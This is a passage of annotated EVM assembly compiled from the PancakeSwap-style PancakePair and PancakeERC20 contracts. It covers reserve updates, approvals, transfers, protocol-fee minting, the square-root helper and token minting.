\"src/exchange-protocol/contracts/PancakePair.sol\":3499:3619  price0CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3673:3753  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      0xffffffff\n      dup2\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3722  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n      tag_342\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3712:3721  _reserve1 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3705  UQ112x112.encode(_reserve0) */\n      tag_339\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3695:3704  _reserve0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3694  UQ112x112.encode */\n      tag_340\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3705  UQ112x112.encode(_reserve0) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3722  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n    tag_342:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3633:3653  price1CumulativeLast */\n      0x0d\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3633:3753  price1CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3673:3723  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3673:3753  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3633:3753  price1CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3368:3764  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n    tag_337:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3773:3781  reserve0 */\n      0x0b\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3773:3801  reserve0 = uint112(balance0) */\n      dup1\n      sload\n      not(0xffffffffffffffffffffffffffff)\n      and\n      sub(shl(0x70, 0x01), 0x01)\n      dup9\n      dup2\n      and\n      swap2\n      swap1\n      swap2\n      or\n      not(shl(0x70, 0xffffffffffffffffffffffffffff))\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3811:3839  reserve1 = uint112(balance1) */\n      and\n      shl(0x70, 0x01)\n      dup9\n      dup4\n      and\n      dup2\n      mul\n      swap2\n      swap1\n      swap2\n      or\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3849:3884  blockTimestampLast = blockTimestamp */\n      and\n      shl(0xe0, 0x01)\n      0xffffffff\n      dup8\n      and\n      mul\n      or\n      swap3\n      dup4\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3899:3923  Sync(reserve0, reserve1) */\n      0x40\n      dup1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3904:3912  reserve0 */\n      dup5\n      dup5\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3899:3923  Sync(reserve0, reserve1) */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3914:3922  reserve1 */\n      swap2\n      swap1\n      swap4\n      div\n      swap1\n      swap2\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3899:3923  Sync(reserve0, reserve1) */\n      0x20\n      dup3\n      add\n      mstore\n      dup2\n      mload\n      0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\n      swap3\n      swap2\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2947:3930  function _update(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_183:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2544  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2560  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2568  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2583:2614  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n    tag_190:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2732  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      tag_346\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2743:2748  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2742  balanceOf[from].sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_346:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2714  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2749  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2788  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      tag_347\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2793:2798  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2792  balanceOf[to].add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_347:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2768  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2799  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4016:4916  function _mintFee(... */\n    tag_204:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4111:4121  bool feeOn */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4133:4146  address feeTo */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4165:4172  factory */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4179  IPancakeFactory(factory).feeTo */\n      and\n      0x017e7e58\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_350\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_350:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_351\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_351:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_352\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_352:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4242:4247  kLast */\n      sload(0x0e)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4199:4218  feeTo != address(0) */\n      dup3\n      and\n      iszero\n      dup1\n      iszero\n      swap5\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      swap2\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4242:4247  kLast */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4272:4910  if (feeOn) {... */\n      tag_353\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4301:4312  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4297:4843  if (_kLast != 0) {... */\n      tag_354\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4332:4342  uint rootK */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4345:4386  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      tag_355\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4385  uint(_reserve0).mul(_reserve1) */\n      tag_208\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4370  uint(_reserve0) */\n      dup9\n      dup2\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4385  uint(_reserve0).mul(_reserve1) */\n      dup9\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4374  uint(_reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4385  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4345:4386  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n    tag_355:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4332:4386  uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4404:4418  uint rootKLast */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4421:4438  Math.sqrt(_kLast) */\n      tag_357\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4431:4437  _kLast */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4421:4430  Math.sqrt */\n      tag_209\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4421:4438  Math.sqrt(_kLast) */\n      jump\t// in\n    tag_357:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4404:4438  uint rootKLast = Math.sqrt(_kLast) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4468:4477  rootKLast */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4460:4465  rootK */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4460:4477  rootK > rootKLast */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4456:4829  if (rootK > rootKLast) {... */\n      iszero\n      tag_358\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4501:4515  uint numerator */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4608  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      tag_359\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4585:4586  8 */\n      0x08\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4555  totalSupply.mul(rootK.sub(rootKLast)) */\n      tag_175\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4554  rootK.sub(rootKLast) */\n      tag_361\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4539  rootK */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4544:4553  rootKLast */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4554  rootK.sub(rootKLast) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4543  rootK.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4554  rootK.sub(rootKLast) */\n      and\n      jump\t// in\n    tag_361:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4529  totalSupply */\n      sload(0x00)\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4555  totalSupply.mul(rootK.sub(rootKLast)) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4533  totalSupply.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4555  totalSupply.mul(rootK.sub(rootKLast)) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4608  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n    tag_359:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4501:4608  uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4630:4646  uint denominator */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4684  rootK.mul(17).add(rootKLast.mul(8)) */\n      tag_362\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4683  rootKLast.mul(8) */\n      tag_363\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4676  rootKLast */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4681:4682  8 */\n      0x08\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4683  rootKLast.mul(8) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4680  rootKLast.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4683  rootKLast.mul(8) */\n      and\n      jump\t// in\n    tag_363:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4662  rootK.mul(17) */\n      tag_364\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4654  rootK */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4659:4661  17 */\n      0x11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4662  rootK.mul(17) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4658  rootK.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4662  rootK.mul(17) */\n      and\n      jump\t// in\n    tag_364:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4666  rootK.mul(17).add */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4684  rootK.mul(17).add(rootKLast.mul(8)) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4666  rootK.mul(17).add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4684  rootK.mul(17).add(rootKLast.mul(8)) */\n      and\n      jump\t// in\n    tag_362:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4630:4684  uint denominator = rootK.mul(17).add(rootKLast.mul(8)) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4706:4720  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4735:4746  denominator */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4723:4732  numerator */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4723:4746  numerator / denominator */\n      dup2\n      tag_365\n      jumpi\n      invalid\n    tag_365:\n      div\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4772:4785  liquidity > 0 */\n      dup1\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4768:4810  if (liquidity > 0) _mint(feeTo, liquidity) */\n      tag_367\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4787:4810  _mint(feeTo, liquidity) */\n      tag_367\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4793:4798  feeTo */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4800:4809  liquidity */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4787:4792  _mint */\n      tag_211\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4787:4810  _mint(feeTo, liquidity) */\n      jump\t// in\n    tag_367:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4456:4829  if (rootK > rootKLast) {... */\n      pop\n      pop\n      pop\n    tag_358:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4297:4843  if (_kLast != 0) {... */\n      pop\n      pop\n    tag_354:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4272:4910  if (feeOn) {... */\n      jump(tag_369)\n    tag_353:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4863:4874  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4859:4910  if (_kLast != 0) {... */\n      tag_369\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4898:4899  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4890:4895  kLast */\n      0x0e\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4890:4899  kLast = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4859:4910  if (_kLast != 0) {... */\n    tag_369:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4016:4916  function _mintFee(... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n    tag_209:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":400:409  uint256 z */\n      0x00\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":429:430  3 */\n      0x03\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":425:426  y */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":425:430  y > 3 */\n      gt\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":421:647  if (y > 3) {... */\n      iszero\n      tag_371\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":450:451  y */\n      dup1\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":485:486  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":481:482  2 */\n      0x02\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":477:482  y / 2 */\n      dup3\n      div\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":477:486  y / 2 + 1 */\n      add\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":500:589  while (x < z) {... */\n    tag_373:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":511:512  z */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":507:508  x */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":507:512  x < z */\n      lt\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":500:589  while (x < z) {... */\n      iszero\n      tag_374\n      jumpi\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":536:537  x */\n      dup1\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":532:537  z = x */\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":573:574  2 */\n      0x02\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":568:569  x */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":564:565  x */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":560:561  y */\n      dup6\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":560:565  y / x */\n      dup2\n      tag_375\n      jumpi\n      invalid\n    tag_375:\n      div\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":560:569  y / x + x */\n      add\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":559:574  (y / x + x) / 2 */\n      dup2\n      tag_376\n      jumpi\n      invalid\n    tag_376:\n      div\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":555:574  x = (y / x + x) / 2 */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":500:589  while (x < z) {... */\n      jump(tag_373)\n    tag_374:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":421:647  if (y > 3) {... */\n      pop\n      jump(tag_378)\n    tag_371:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":609:615  y != 0 */\n      dup2\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":605:647  if (y != 0) {... */\n      tag_378\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":635:636  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":605:647  if (y != 0) {... */\n    tag_378:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1550:1750  function _mint(address to, uint256 value) internal {... */\n    tag_211:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1636  totalSupply */\n      sload(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1647  totalSupply.add(value) */\n      tag_380\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1641:1646  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1647  totalSupply.add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1640  totalSupply.add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1647  totalSupply.add(value) */\n      and\n      jump\t// in\n    tag_380:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1611:1622  totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1611:1647  totalSupply = totalSupply.add(value) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1686  balanceOf[to] */\n      dup4\n      and\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1682  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1686  balanceOf[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1697  balanceOf[to].add(value) */\n      tag_381\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1691:1696  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1697  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1690  balanceOf[to].add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1697  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_381:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1670  balanceOf[to] */\n      dup4\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1666  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1670  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1697  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1712:1743  Transfer(address(0), to, value) */\n      dup4\n      mload\n      dup6\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1657:1670  balanceOf[to] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      